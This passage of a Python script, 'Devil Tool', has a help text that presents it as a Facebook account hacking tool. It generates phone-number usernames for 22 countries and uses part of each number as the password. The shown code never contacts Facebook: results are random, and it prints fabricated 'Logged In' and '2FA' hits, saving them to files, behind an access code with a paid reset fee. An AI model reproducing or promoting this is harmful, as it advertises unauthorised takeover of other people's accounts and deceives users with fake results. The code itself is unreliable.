                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(germ)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def MAL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Malaysia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(mal)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                
                
                
                
                
                    
                if CC=='01' or CC=='1':
                    IND()
                    sys.exit()
                if CC=='02' or CC=='2':
                    US()
                    sys.exit()
                if CC=='03' or CC=='3':
                    CHIN()
                    sys.exit()
                if CC=='04' or CC=='4':
                    INDO()
                    sys.exit()
                    
                if CC=='05' or CC=='5':
                    BRA()
                    sys.exit()
                    
                if CC=='06' or CC=='6':
                    MEX()
                    sys.exit()
                elif CC=='07' or CC=='7':
                    PHIL()
                    sys.exit()
                elif CC=='08' or CC=='8':
                    VT()
                    sys.exit()
                elif CC=='09' or CC=='9':
                    THAI()
                    sys.exit()
                
                elif CC=='10':
                    EG()
                    sys.exit()
                elif CC=='11':
                    BD()
                    sys.exit()
                elif CC=='12':
                    PAK()
                    sys.exit()
                elif CC=='13':
                    COLOM()
                    sys.exit()
                elif CC=='14':
                    UK()
                    sys.exit()
                elif CC=='15':
                    RUS()
                    sys.exit()
                elif CC=='16':
                    TURK()
                    sys.exit()
                elif CC=='17':
                    FR()
                    sys.exit()
                elif CC=='18':
                    ARG()
                    sys.exit()
                elif CC=='19':
                    ITAL()
                    sys.exit()
                elif CC=='20':
                    NIG()
                    sys.exit()
                elif CC=='21':
                    GERM()
                    sys.exit()
                elif CC=='22':
                    MAL()
                    sys.exit()
                else:
                    print(colored('[!] Invalid Option','red'))
                    time.sleep(1)
                    Country()
                
            Country()
            
        def Level():
            os.system('clear')
            print(banner)
            print(colored(f'''{59*equal}
                [01] Attack Level - 1
                [02] Attack Level - 2
                [03] Attack Level - 3\n{59*equal}
                [00] Back Menu
            ''','red'))
            level=colored('Level','red',attrs=['bold'])
            at=input(f"{level}>>")
            if at=="01" or at=="1":
                print("Loading...")
                time.sleep(1)
                Attack1()
                
            elif at=="02" or at=="2":
                print("Loading...")
                time.sleep(1)
                Attack2()
                
            elif at=="03" or at=="3":
                print("Loading...")
                time.sleep(1)
                Attack3()
                
            elif at=="00":
                Menu()
                sys.exit()
            else:
                print('Invalid Level.')
                time.sleep(1)
                Level()
            
        
        def Menu():
            os.system('clear')
            print(banner)
            co=['red','blue','yellow','green','cyan']
            colors=random.choice(co)
            print(colored(f'''{59*equal}
                [01] Start Hacking
                [00] Show help\n{59*equal}''','red'))
            o=colored('Option','red',attrs=['bold'])
            inp=input(f'{o}>>')
            if inp=='01' or inp=='1':
                print('Loading...')
                time.sleep(1)
                Level()
                #sys.exit()
            elif inp=='00':
                
                xxx=["""
Show help



Hello dear user, this is Josif, admin of this tool.

There are Some Common Questions & Answers You Must Know First.


What is Devil Tool?

Devil Tool is a Facebook Accounts Hacking Tool, which allow you to check unlimited facebook accounts, And feedback you with a facebook account login number and password which is not yours.


What Devil Tool Can Does?

The Most thing devil tool do is, finds facebook login vulnerablity username and password.
Devil Tool can generate unlimited phone numbers and this tool can finds unlimited facebook accounts. Devil Tool Finds random facebook user login details such as number and password, after that devil tool share those login details with you. Every time devil tool generate unique facebook accounts from 20+ country.

Supported Countries in Devil Tool


                [01]     India
                [02]     United States
                [03]     China
                [04]     Indonesia
                [05]     Brazil
                [06] Mexico
                [07] Philippines
                [08] Vietnam
                [09]         Thailand
                [10]    Egypt
                [11]            Bangladesh
                [12]            Pakistan
                [13]        Colombia
                [14]    United Kingdom
                [15]    Russia
                [16]    Turkey
                [17]            France
                [18]            Argentina
                [19]        Italy
                [20]        Nigeria
                [21]    Germany
                [22]    Malaysia

How To Use Devil Tool?:
    1: Run devil tool with python 3.
    2: Enter access code for first time, press enter.
    3: Type 1 for 'Start Hacking' , press enter
    4: Select hacking level type 1, 2 or 3 , press enter.
    5: Select country in digits 1 to 22, press enter.
    6: Set range in digits minimum 1, maximum no limit. range means how many accounts you want to check.
RESULT:
    1: 'Searching For Accounts' Means not a valid account or deleted accounts.
    2: 'Logged In' in green color, means , this account has been hacked.
    3: All green color text means Hacked Account.
    4: 'Incorrect' in red color, means valid account but not hacked.
If you have any problem contact me.

Phone: +8801946176869 (active)
Facebook: facebook.com/josifkhangg

(check description)

WARNING:

IF YOU LOST YOUR ACCESS CODE, YOU WILL BE CHARGED 50TK FOR RESET YOUR ACCESS CODE.
(WRITE YOUR ACCESS CODE IN PRIVATE AND SAFE PLACE. or UPLOAD A BACKUP ON DRIVE)"""]
                for xx in xxx:
                    for x in xx:
                        time.sleep(0.03)
                        print(x,end='')
                        sys.stdout.flush()
                
                
                ccc=colored('\nEnter to reload','blue')
                input(f'{ccc}>>')
                time.sleep(0.5)
                Menu()
            else:
                print('Invalid Option')
                time.sleep(1)
                Menu()
            
        #Country()
        
                
                
        def AccessPoint():
            open('.access','a')
            os.system('clear')
            print(banner)
            access=open('.access','r').read()
            if access=='101':
                Menu()
            else:
                aaa=colored('Access Code','red',attrs=['bold'])
                ac=input(f'{aaa}>>')
                if ac=='101':
                    open('.access','a').write('101')
                    
                    acg=[21*'=',colored(' Access Granted!','green'),21*'=']
                    for Acg in acg:
                        for Ac in Acg:
                            time.sleep(0.05)
                            print(Ac,end='')
                            sys.stdout.flush()
                    time.sleep(1.5)
                    Menu()
                    #sys.exit()
                else:
                    acd=[22*'=',colored(' Access Denied!','red'),22*'=']
                    for Acd in acd:
                        for Ad in Acd:
                            time.sleep(0.04)
                            print(Ad,end='')
                            sys.stdout.flush()
                            
                    time.sleep(1.5)
                    AccessPoint()
        AccessPoint()
        
    Loggef()
    
    
    
except ModuleNotFoundError:
    open('requirements','w').write('requests\ntermcolor\n')
    print('Installing requirements, please wait...')
    os.system('pip install -r requirements')
    time.sleep(1)
    print('<<Restart Program>>')
except requests.exceptions.ConnectionError:
    print(colored(" Connection Lost ","white","on_red",attrs=['bold']))
    sys.exit()
except KeyboardInterrupt:
    open('.logs','w')
    open('.broken','w')
    print('\n[+] Stopped',colored('Ok','green'))
    time.sleep(1)
    input('Enter to exit...')
    sys.exit()
except ValueError:
    print('Invalid Type')
    pass




